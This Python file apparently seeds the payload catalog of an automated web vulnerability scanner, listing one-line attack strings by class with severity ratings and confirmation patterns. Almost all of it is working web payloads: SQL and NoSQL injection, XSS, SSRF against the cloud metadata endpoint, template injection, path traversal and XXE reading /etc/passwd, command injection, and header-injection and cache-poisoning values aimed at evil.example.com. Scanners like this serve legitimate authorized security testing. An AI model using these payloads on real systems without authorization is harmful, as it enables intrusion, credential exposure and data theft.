from __future__ import annotations

from core.payloads.schema import Payload

# Minimal built-in seed set so the catalog is useful before external ingestion.
# One-liners per class; the real depth comes from nuclei / PayloadsAllTheThings
# ingestion (catalog.ingest_*), scored/expanded over time by record_outcome.

def _p(vc, text, **kw):
    # Curated seeds rank above raw community payloads (0.5 default) so the first
    # payloads fired per class are the reliable, high-signal ones.
    kw.setdefault("effectiveness_score", 0.9)
    return Payload(vuln_class=vc, payload_text=text, source="seed", **kw)


SEED_PAYLOADS = [
    # SQLi
    _p("sqli", "' OR '1'='1", subclass="boolean", context="url", severity="HIGH",
       confirm_patterns=["sql", "syntax", "mysql", "postgres"]),
    _p("sqli", "1' AND SLEEP(5)-- -", subclass="time_based", context="url", severity="HIGH"),
    _p("sqli", "' UNION SELECT NULL-- -", subclass="union", context="url", severity="HIGH"),
    _p("sqli", '{"$ne":null}', subclass="nosql", context="json_body", severity="HIGH"),
    # XSS
    _p("xss", "<script>alert(1)</script>", subclass="reflected", context="html_body",
       severity="MEDIUM", confirm_patterns=["<script>alert(1)</script>"]),
    _p("xss", "\"><img src=x onerror=alert(1)>", context="html_attr", severity="MEDIUM"),
    _p("xss", "javascript:alert(1)", context="url", severity="MEDIUM"),
    # SSRF
    _p("ssrf", "http://169.254.169.254/latest/meta-data/", context="url", severity="HIGH",
       confirm_patterns=["ami-id", "instance-id", "iam"]),
    _p("ssrf", "http://127.0.0.1:80/", context="url", severity="HIGH"),
    # SSTI
    _p("ssti", "{{7*7}}", context="url", severity="HIGH", confirm_patterns=["49"]),
    _p("ssti", "${7*7}", context="url", severity="HIGH", confirm_patterns=["49"]),
    _p("ssti", "<%= 7*7 %>", context="url", severity="HIGH", confirm_patterns=["49"]),
    # LFI / path traversal
    _p("lfi", "../../../../etc/passwd", context="url", severity="HIGH",
       confirm_patterns=["root:.*:0:0:"]),
    _p("lfi", "..\\..\\..\\..\\windows\\win.ini", context="url", severity="HIGH",
       confirm_patterns=["\\[fonts\\]"]),
    # XXE
    _p("xxe", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
       context="json_body", severity="HIGH", confirm_patterns=["root:.*:0:0:"]),
    # RCE / command injection
    _p("rce", ";id", context="url", severity="CRITICAL", confirm_patterns=["uid=", "gid="]),
    _p("rce", "|whoami", context="url", severity="CRITICAL"),
    # Open redirect
    _p("open_redirect", "//evil.example.com", context="url", severity="MEDIUM"),
    _p("open_redirect", "https://evil.example.com", context="url", severity="MEDIUM"),
    # CORS
    _p("cors_misconfiguration", "Origin: https://evil.example.com", context="header",
       severity="MEDIUM"),
    # Prototype pollution
    _p("prototype_pollution", '{"__proto__":{"polluted":true}}', context="json_body",
       severity="HIGH", confirm_patterns=["polluted"]),
    # Host header injection
    _p("host_header_injection", "Host: evil.example.com", context="header", severity="MEDIUM"),
    # Cache poisoning — unkeyed header reflection. A unique marker host/value in an
    # unkeyed request header that surfaces in the (cacheable) response body/headers
    # proves the header influences the cached response. Generic; no app specifics.
    _p("cache_poisoning", "X-Forwarded-Host: cachepoison-x9k2.evil.example.com",
       context="header", severity="MEDIUM", confirm_patterns=["cachepoison-x9k2.evil.example.com"]),
    _p("cache_poisoning", "X-Forwarded-Scheme: nothttps", context="header", severity="MEDIUM"),
    _p("cache_poisoning", "X-Forwarded-Host: cachepoison-x9k2.evil.example.com\r\nX-Forwarded-Scheme: http",
       context="header", severity="MEDIUM", confirm_patterns=["cachepoison-x9k2.evil.example.com"]),
    _p("cache_poisoning", "X-Host: cachepoison-x9k2.evil.example.com",
       context="header", severity="MEDIUM", confirm_patterns=["cachepoison-x9k2.evil.example.com"]),
    _p("cache_poisoning", "X-Forwarded-Prefix: /cachepoison-x9k2",
       context="header", severity="MEDIUM", confirm_patterns=["cachepoison-x9k2"]),
]
